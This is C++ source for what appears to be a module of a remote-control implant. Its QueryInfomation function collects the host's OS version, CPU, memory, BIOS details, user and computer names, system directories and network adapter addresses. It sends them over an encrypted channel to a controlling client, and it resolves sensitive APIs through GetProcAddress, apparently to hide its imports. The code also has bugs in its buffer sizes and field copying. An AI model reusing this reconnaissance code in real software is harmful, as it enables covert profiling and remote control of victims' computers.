#include <winsock2.h>
#include <iphlpapi.h>
#include <Nb30.h>
#include <vector>
#include <string>

#include "queryInfo.h"
#include "macro.h"
#include "conn.h"
#include "svrdll.h"
#include <Windows.h>

using namespace std;
/*
class HelpQueryClass
{
public:
	DECLARE_DLLINFO_MAP()
};

BEGIN_DLLINFO_MAP(HelpQueryClass)
	ADD_DLLINFO_ENTRY(CONTROL_QUERY_INFO, 0, "QueryInfomation")
END_DLLINFO_MAP()

int GetDllFuncCnt(){return HelpQueryClass::GetInfoCnt();}

const dll_info* GetDllFuncs(){return HelpQueryClass::GetInfos();}
*/
struct AdapterInfo{
	unsigned int		mac_len;
	unsigned char		mac[8];
	unsigned long		index;
	unsigned int		type;
	char				name[132];

	string_ip			ips[16];
	string_ip			ip_masks[16];
	int nips;


	string_ip			gateways[16];
	string_ip			gateway_masks[16];
	int ngws;
};

int GetAdaptersList(struct AdapterInfo infos[])
{
	IP_ADAPTER_INFO pai[10];
	ULONG ulSize = sizeof(pai);
	int nAdapters = 0;

	HMODULE hModule = LoadLibraryA("Iphlpapi.dll");
	if(hModule == NULL)	return -1;

	typedef ULONG (*fGetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);	
	fGetAdaptersInfo f = (fGetAdaptersInfo)GetProcAddress(hModule, "GetAdaptersInfo");
	if(f == NULL)	return -1;

	if(f(pai, &ulSize) != ERROR_SUCCESS)
		return -1;
	
	IP_ADAPTER_INFO* p = &pai[0];
	while(p)
	{
		//Fill mac-address info
		infos[nAdapters].mac_len = p->AddressLength;
		memcpy(infos[nAdapters].mac, p->Address, p->AddressLength);
		infos[nAdapters].index = p->Index;
		infos[nAdapters].type = p->Type;
		strcpy_s(infos[nAdapters].name, sizeof(p->Description), p->Description);

		//Get IP info
		infos[nAdapters].nips = 0;
		IP_ADDR_STRING* pipList = &p->IpAddressList;
		while(pipList)
		{
			int idx = infos[nAdapters].nips;
			strcpy_s(infos[nAdapters].ips[idx], 32, pipList->IpAddress.String);
			strcpy_s(infos[nAdapters].ip_masks[idx], 32, pipList->IpMask.String);
			pipList = pipList->Next;
			infos[nAdapters].nips ++;
		}
		
		//Get gateway info
		infos[nAdapters].ngws = 0;
		IP_ADDR_STRING* pGatewayList = &p->GatewayList;
		while(pGatewayList)
		{
			int idx = infos[nAdapters].ngws;
			strcpy_s(infos[nAdapters].gateways[idx], 32, pGatewayList->IpAddress.String);
			strcpy_s(infos[nAdapters].gateway_masks[idx], 32, pGatewayList->IpMask.String);
			pGatewayList = pGatewayList->Next;
			infos[nAdapters].ngws ++;
		}

		nAdapters++;
		p = p->Next;
	}
	
	return nAdapters;
}

int GetNetworkInfo(struct network_info nws[], int maxCnt)
{
	struct AdapterInfo infos[16];
	int n = 16;

	if( (n = GetAdaptersList(infos)) > 0)
	{
		if(n > maxCnt)	n = maxCnt;
		for(int i = 0; i < n; i++)
		{
			if(infos[i].nips > 0)
			{
				strcpy(nws[i].ip, infos[i].ips[0]);
				strcpy(nws[i].gateway, infos[i].gateways[0]);
			}
			if(infos[i].ngws > 0)
			{
				strcpy(nws[i].mask, infos[i].ip_masks[0]);
				strncpy(nws[i].name, infos[i].name, sizeof(nws[i].name));
			}
		}
		return n;
	}
	return 0;
}

int QueryInfomation(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_QUERY_INFO);
	//control_header header = INITIALIZE_HEADER(CONTROL_QUERY_INFO);
	int nStatus = 0;
	system_info info;

	memset(&info, 0, sizeof(info));

	//操作系统版本
	OSVERSIONINFOEXA os; 
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA); 
	if(GetVersionExA((OSVERSIONINFOA *)&os)){ 
		info.windows.majorVersion = os.dwMajorVersion;
		info.windows.minorVersion = os.dwMinorVersion;
		info.windows.buildNumber = os.dwBuildNumber;
		info.windows.platformId = os.dwPlatformId;
		info.windows.productType = os.wProductType;
	}

	//CPU
	SYSTEM_INFO	sysInfo = {0};
	HKEY hKey;
	unsigned char tmp[280];
	ULONG cb;
	GetSystemInfo(&sysInfo);
	info.cpuCount = sysInfo.dwNumberOfProcessors;

	HMODULE hModule = GetModuleHandleA("advapi32.dll");
	if(hModule == NULL)	hModule = LoadLibraryA("advapi32.dll");

	typedef LSTATUS (__stdcall* MyRegOpenKeyEx)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
	typedef LSTATUS (__stdcall* MyRegQueryValueEx)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
	typedef LSTATUS (__stdcall* MyRegCloseKey)(HKEY);
	
	MyRegOpenKeyEx openReg = NULL;
	MyRegQueryValueEx queryReg = NULL;
	MyRegCloseKey closeReg = NULL;
	if(hModule)
	{
		openReg = (MyRegOpenKeyEx)GetProcAddress(hModule, "RegOpenKeyExA");
		queryReg = (MyRegQueryValueEx)GetProcAddress(hModule, "RegQueryValueExA");
		closeReg = (MyRegCloseKey)GetProcAddress(hModule, "RegCloseKey");
	}
	
	if (openReg && openReg(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
		0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		//获取处理器名称
		cb = sizeof(tmp);
		if(queryReg && queryReg(hKey, "ProcessorNameString", NULL, NULL, tmp, &cb) == ERROR_SUCCESS)	
			strncpy(info.cpuDesc, (char*)tmp, sizeof(info.cpuDesc)-1);
		
		//获取处理器主频
		cb = sizeof(info.cpuSpeed);
		if(queryReg)	queryReg(hKey, "~MHz", NULL, NULL, (LPBYTE)&info.cpuSpeed, &cb);

		if(closeReg)	closeReg(hKey);
	}

	//内存
	MEMORYSTATUSEX Buffer = {0};
	Buffer.dwLength = sizeof(Buffer);
	GlobalMemoryStatusEx(&Buffer);
	info.totalMemory = Buffer.ullTotalPhys/1024;
	info.availMemory = Buffer.ullAvailPhys/1024;
	
	if (openReg && openReg(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS",
		0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		cb = sizeof(tmp);
		if(queryReg && queryReg(hKey, "BIOSVendor", NULL, NULL, tmp, &cb) == ERROR_SUCCESS)
			strncpy(info.biosDesc, (char*)tmp, sizeof(info.biosDesc)-1);

		cb = sizeof(tmp);
		if(queryReg && queryReg(hKey, "BIOSVersion", NULL, NULL, tmp, &cb) == ERROR_SUCCESS)
			strncat(info.biosDesc, (char*)tmp, sizeof(info.biosDesc)-1);

		if(closeReg)	closeReg(hKey);
	}

	if(hModule)	
	{
		//用户名
		DWORD len = 64;
		FARPROC fGetUser = GetProcAddress(hModule, "GetUserNameA");
		((BOOL (__stdcall*)(LPSTR, LPDWORD))fGetUser)/*GetUserNameA*/(info.userName, &len);
		
		//计算机名称
		len = 64;
		FARPROC fGetPCName = GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameA");
		((BOOL (__stdcall*)(LPSTR, LPDWORD))fGetPCName)/*GetComputerNameA*/(info.computerName, &len);
	}

	//系统目录
	char buffer[64];
	if(GetSystemDirectoryA(buffer, sizeof(buffer)))
		strncpy(info.sysDir, buffer, sizeof(info.sysDir)-1);
	if(GetWindowsDirectoryA(buffer, sizeof(buffer)))
		strncpy(info.winDir, buffer, sizeof(info.winDir)-1);

	const int maxNW = 16;
	struct network_info nws[maxNW];
	char sendBuf[maxNW*sizeof(network_info)+sizeof(info)];
	int cntNW = GetNetworkInfo(nws, maxNW);
	info.cntNW = cntNW;

	if(fn)
	{
		header.dataLen = sizeof(info) + cntNW * sizeof(struct network_info);
		memcpy(sendBuf, &info, sizeof(info));
		memcpy(sendBuf+sizeof(info), &nws[0], cntNW * sizeof(network_info));
		fn(s, &header, sendBuf, header.dataLen);
	}

	return 0;
}